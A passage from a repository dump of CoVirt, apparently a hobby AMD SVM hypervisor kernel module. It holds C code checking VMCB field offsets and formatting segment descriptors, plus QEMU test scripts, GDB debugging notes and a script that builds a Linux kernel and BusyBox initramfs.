+
+	check_entry_offset(ssa_offset + 0x0D0, (uint64_t) &vmcb->state_save_area.efer, "efer");
+
+	check_entry_offset(ssa_offset + 0x148, (uint64_t) &vmcb->state_save_area.cr4, "cr4");
+	check_entry_offset(ssa_offset + 0x150, (uint64_t) &vmcb->state_save_area.cr3, "cr3");
+	check_entry_offset(ssa_offset + 0x158, (uint64_t) &vmcb->state_save_area.cr0, "cr0");
+	check_entry_offset(ssa_offset + 0x160, (uint64_t) &vmcb->state_save_area.dr7, "dr7");
+	check_entry_offset(ssa_offset + 0x168, (uint64_t) &vmcb->state_save_area.dr6, "dr6");
+	check_entry_offset(ssa_offset + 0x170, (uint64_t) &vmcb->state_save_area.rflags, "rflags");
+	check_entry_offset(ssa_offset + 0x178, (uint64_t) &vmcb->state_save_area.rip, "rip");
+
+	check_entry_offset(ssa_offset + 0x1D8, (uint64_t) &vmcb->state_save_area.rsp, "rsp");
+	check_entry_offset(ssa_offset + 0x1E0, (uint64_t) &vmcb->state_save_area.s_cet, "s_cet");
+	check_entry_offset(ssa_offset + 0x1E8, (uint64_t) &vmcb->state_save_area.ssp, "ssp");
+	check_entry_offset(ssa_offset + 0x1F0, (uint64_t) &vmcb->state_save_area.isst_addr, "isst_addr");
+	check_entry_offset(ssa_offset + 0x1F8, (uint64_t) &vmcb->state_save_area.rax, "rax");
+	check_entry_offset(ssa_offset + 0x200, (uint64_t) &vmcb->state_save_area.star, "star");
+	check_entry_offset(ssa_offset + 0x208, (uint64_t) &vmcb->state_save_area.lstar, "lstar");
+	check_entry_offset(ssa_offset + 0x210, (uint64_t) &vmcb->state_save_area.cstar, "cstar");
+	check_entry_offset(ssa_offset + 0x218, (uint64_t) &vmcb->state_save_area.sfmask, "sfmask");
+	check_entry_offset(ssa_offset + 0x220, (uint64_t) &vmcb->state_save_area.kernel_gs_base, "kernel_gs_base");
+	check_entry_offset(ssa_offset + 0x228, (uint64_t) &vmcb->state_save_area.sysenter_cs, "sysenter_cs");
+	check_entry_offset(ssa_offset + 0x230, (uint64_t) &vmcb->state_save_area.sysenter_esp, "sysenter_esp");
+	check_entry_offset(ssa_offset + 0x238, (uint64_t) &vmcb->state_save_area.sysenter_eip, "sysenter_eip");
+	check_entry_offset(ssa_offset + 0x240, (uint64_t) &vmcb->state_save_area.cr2, "cr2");
+
+	check_entry_offset(ssa_offset + 0x268, (uint64_t) &vmcb->state_save_area.g_pat, "g_pat");
+	check_entry_offset(ssa_offset + 0x270, (uint64_t) &vmcb->state_save_area.dbgctl, "dbgctl");
+	check_entry_offset(ssa_offset + 0x278, (uint64_t) &vmcb->state_save_area.br_from, "br_from");
+	check_entry_offset(ssa_offset + 0x280, (uint64_t) &vmcb->state_save_area.br_to, "br_to");
+	check_entry_offset(ssa_offset + 0x288, (uint64_t) &vmcb->state_save_area.last_excp_from, "last_excp_from");
+
+	check_entry_offset(ssa_offset + 0x2E0, (uint64_t) &vmcb->state_save_area.spec_ctrl, "spec_ctrl");
+
+	DEBUG_PRINT("State-save area kinda done checking... \n");
+
+	DEBUG_PRINT("----- END VMCB DEBUG OUTPUT -----\n");
+}
+
+// A helper we'll use for checking that our VMCB struct is accurate.
+void check_entry_offset(uint16_t offset, uint64_t e_ptr, char * name){
+	// The VMCB is only like 4KB (0x1000) wide. Offsets shouldn't be going past this. 
+	if ((e_ptr & 0xfff) != offset){
+		DEBUG_PRINT("VMCB_T INCORRECT. %s is at offset 0x%x, should be at 0x%x\n", name, (uint16_t)(e_ptr & 0xfff), offset);
+	}
+	DEBUG_PRINT("DEBUG- %s at 0x%x: %llx", name, (uint16_t)(e_ptr & 0xfff), *(uint64_t *)e_ptr);
+	return;
+}
+
+/*
+	Utility: Format the segment descriptors so as to fit properly into the VMCB
+
+	Additional Notes:
+	Takes in a 64 bit descriptor (pointed to by the selectors in segment registers)
+	Takes in the selector (This is what is stored in the segment registers)
+*/
+segment_t format_segment(uint64_t descriptor, uint16_t selector) {
+	segment_t formatted_segment;
+	
+	// Attribute Mask (lower and higher parts)
+	uint64_t a_mask_lo = 0xffUL << (32 + 8);  // Original pos offset = 40
+	uint16_t a_shift_lo = 40;  // For concatenation, we need to shift this back down
+	uint64_t a_mask_hi = 0xfUL << (32 + 20); 	// Original pos offset = 52
+	uint16_t a_shift_hi = 44;  // For concatenation, shift back (52 - 8), accounting for the low bits
+
+	// Limit Mask (lower and higher parts)
+	uint64_t l_mask_lo = 0xffffUL;	// Original pos offset = 0
+	uint16_t l_shift_lo = 0;
+	uint64_t l_mask_hi = 0xfUL << (32 + 16);	// Original pos offset = 48
+	uint64_t l_shift_hi = 32;	// For concatenation, shift back (48 - 16), accounting for low bits
+
+
+	// Base Mask (lower and higher parts)
+	uint64_t b_mask_lo = 0xffffffUL << 32;	// Original Pos offset = 32;
+	uint64_t b_shift_lo = 32;
+	uint64_t b_mask_hi = 0xffffffffUL << (32 + 24);	// Original pos offset = 56
+	uint64_t b_shift_hi	= 24;
+
+	// We'll have the selector already as this is what is stored in the segment register
+	formatted_segment.selector = selector;
+
+	// Get attributes
+	formatted_segment.attrib = (uint16_t) (((descriptor & a_mask_lo) >> a_shift_lo) + ((descriptor & a_mask_hi) >> a_shift_hi));
+
+	// Get limit
+	formatted_segment.limit = (uint32_t) (((descriptor & l_mask_lo) >> l_shift_lo) + ((descriptor & l_mask_hi) >> l_shift_hi));
+
+	// Get Base 
+	formatted_segment.base = (uint64_t) (((descriptor & b_mask_lo) >> b_shift_lo) + ((descriptor & b_mask_hi) >> b_shift_hi));
+
+	return formatted_segment;
+}
+
+
+```
+
+`covirt/test.sh`:
+
+```sh
+#!/bin/bash
+
+export PLAY="`pwd`/../testing_playground"
+export KERNEL_ROOT="$PLAY/obj/linux-basic"
+
+echo "Testing playground: $PLAY"
+echo "Kernel Root: $KERNEL_ROOT"
+
+make clean KERNEL_ROOT=$KERNEL_ROOT
+make KERNEL_ROOT=$KERNEL_ROOT
+if [ $? = 0 ]
+then
+	gcc -static -o unit_tester src/unit_tester.c
+	if [ $? = 0 ]
+	then	
+		cp unit_tester $PLAY/initramfs/busybox/unit_tester
+		cp turn_off_logging.sh $PLAY/initramfs/busybox/turn_off_logging.sh
+		cp covirt_module.ko $PLAY/initramfs/busybox/covirt_module.ko
+		cd $PLAY/initramfs/busybox
+		find . -print0 | cpio --null -ov --format=newc | gzip -9 > $PLAY/obj/initramfs-busybox.cpio.gz
+		cd $PLAY
+
+		# Important things:
+		# -enable-kvm (enables KVM)
+		# -cpu host (specifies that we want the spun up box to act like an L1/another host. This enables things like NRIP_SAVE)
+		#qemu-system-x86_64 -cpu host,-x2apic -enable-kvm -m 2048 -smp 1 -kernel $PLAY/obj/linux-basic/arch/x86_64/boot/bzImage -initrd obj/initramfs-busybox.cpio.gz -s -append "console=ttyS0 nokaslr" -nographic
+
+		qemu-system-x86_64 -curses -display gtk -cpu host,-x2apic -enable-kvm -m 2048 -smp 1 -kernel $PLAY/obj/linux-basic/arch/x86_64/boot/bzImage -initrd obj/initramfs-busybox.cpio.gz -s -append "nokaslr"
+
+		#sudo qemu-system-x86_64 -enable-kvm -m 2048 -smp 1 -kernel ~/playground/obj/linux-basic/arch/x86_64/boot/bzImage -initrd ~/ramdisk.img -s -append "console=ttyS0 nokaslr" -nographic
+	fi
+fi
+
+```
+
+`covirt/turn_off_logging.sh`:
+
+```sh
+#!/bin/sh
+
+dmesg -n 1
+```
+
+`debugging-notes.txt`:
+
+```txt
+### Debugging stuff
+
+If you installed the kernel with the GDB_SCRIPTS enabled, you can do this:
+```
+$ add-auto-load-safe-path <path-to-CoVirt>/CoVirt/testing_playground/linux-5.13/scripts/gdb/vmlinux-gdb.py
+```
+
+If you chose to set up the Testing Playground, from CoVirt/covirt:
+```
+$ gdb ../testing_playground/obj/linux-basic/vmlinux
+(gdb) target remote:1234
+```
+
+After insmod-ing the kernel module, run this so you can reference symbols directly
+```
+(gdb) lx-symbols
+```
+
+```
+# These two lines have been added to the qemu run script, leaving them here for possible future reference
+# They're just for increasing output and stuff.
+# echo 8 > /proc/sys/kernel/DEBUG_PRINT
+# echo 'file kernel/module.c +p' > /sys/kernel/debug/dynamic_debug/control
+```
+
+If you configured the Kernel properly:
+
+- In ~/.gdbinit put the line "add-auto-load-safe-path <path to kernel build>/scripts/gdb/vmlinux-gdb.py
+- To attach GDB to the running kernel:
+	> gdb <path to kernel build>/vmlinux
+	(gdb) target remote : 1234
+- Once you have GDB attached, running "lx-symbols" is super useful (need the vmlinux-gdb.py for this).
+- I already have a 3 second delay after loading the module. This gives you time to do what you want w/ gdb.
+- You can check where the module is being loaded in the dmesg output (I've set it to enable this logging automatically)
+- CLGI is super important. I've put it into the VM_Setup_and_Run routine. This lets you step through the code w/out just hitting the fucking timer interrupts.
+	- CLGI was also important for an atomic VMRUN anyway, I'm just stupid.
+
+
+
+
+```
+
+`setup_playground.sh`:
+
+```sh
+#!/bin/bash
+
+# Taken from Peter's guide. Ty <3
+
+cd testing_playground
+export PLAY=`pwd`
+
+wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.13.tar.xz
+tar xf linux-5.13.tar.xz
+ln -s linux-5.13 linux
+
+wget https://busybox.net/downloads/busybox-1.33.2.tar.bz2
+tar xf busybox-1.33.2.tar.bz2
+ln -s busybox-1.33.2 busybox
+
+mkdir -pv obj/busybox
+
+cd busybox
+make O=../obj/busybox defconfig
+
+make O=../obj/busybox menuconfig
+
+# This will bring up a menu system.  Navigate to Settings -> Build static binary (no shared libs)  Turn this option on.   Then exit and be sure to say "yes" when it asks you to save your configuration.
+
+cd $PLAY/obj/busybox
+make
+make install
+
+cd $PLAY
+mkdir -pv initramfs/busybox
+
+cd initramfs/busybox
+mkdir -pv {bin,sbin,etc,proc,sys,usr/{bin,sbin}}
+
+cp -av $PLAY/obj/busybox/_install/* .
+
+cp $PLAY/init-temp ./init
+
+chmod +x init
+
+find . -print0 | cpio --null -ov --format=newc | gzip -9 > $PLAY/obj/initramfs-busybox.cpio.gz
+
+cd $PLAY/linux
+make O=../obj/linux-basic x86_64_defconfig
+
+cd $PLAY/linux
+make O=../obj/linux-basic menuconfig
+
+cd $PLAY/linux
+make O=../obj/linux-basic -j 4
+
+
+# Example Run:
+# cd $PLAY
+# qemu-system-x86_64 -m 2048 -smp 4 -kernel obj/linux-basic/arch/x86_64/boot/bzImage -initrd obj/initramfs-busybox.cpio.gz
+
+
+```
+
+`testing_playground/init-temp`:
+
+```
+#!/bin/sh
+ 
+# add expected pseudofilesystems
+mount -t proc none /proc
+mount -t sysfs none /sys
+
+# necessary for debug options
+mount -t debugfs none /sys/kernel/debug
+
+#indicate we are alive in user space
+echo "Hello Userland"
+
+#debugging information
+# echo 8 > /proc/sys/kernel/printk
+# echo 'file kernel/module.c +p' > /sys/kernel/debug/dynamic_debug/control
+
+#replace ourselves with a fresh shell
+exec /bin/sh
+
+```
